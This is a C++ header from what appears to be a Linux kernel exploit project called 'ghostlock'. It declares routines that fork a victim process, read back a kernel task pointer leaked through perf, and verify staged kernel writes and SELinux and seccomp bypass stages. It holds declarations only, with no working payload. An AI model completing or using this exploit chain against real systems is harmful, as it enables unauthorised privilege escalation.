#ifndef GHOSTLOCK_VICTIM_PROCESS_HPP
#define GHOSTLOCK_VICTIM_PROCESS_HPP

#include "common.h"
#include "session/victim_context.hpp"

#include <optional>

namespace ghostlock::session::victim {
    /* Verification contexts handed to retry_write_stage callbacks. */
    struct w2_stage_context {
        VictimContext &pipes;
    };

    struct w3_stage_context {
        VictimContext &pipes;
        int32_t leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
    };

    /* Fork the victim and read back the task pointer perf leaked. Returns
     * nullopt when the fork/pipe setup failed (retryable). */
    struct VictimSpawn {
        pid_t pid;
        uintptr_t task;
    };

    std::optional<VictimSpawn> spawn_victim(VictimContext &p);

    /* Stage verification callbacks. */
    int32_t verify_selinux_stage(void *context);

    int32_t verify_w2_stage(void *context);

    int32_t verify_seccomp_probe_stage(void *context);

    int32_t verify_leaf_dir_stage(void *context);
} // namespace ghostlock::session::victim

#endif
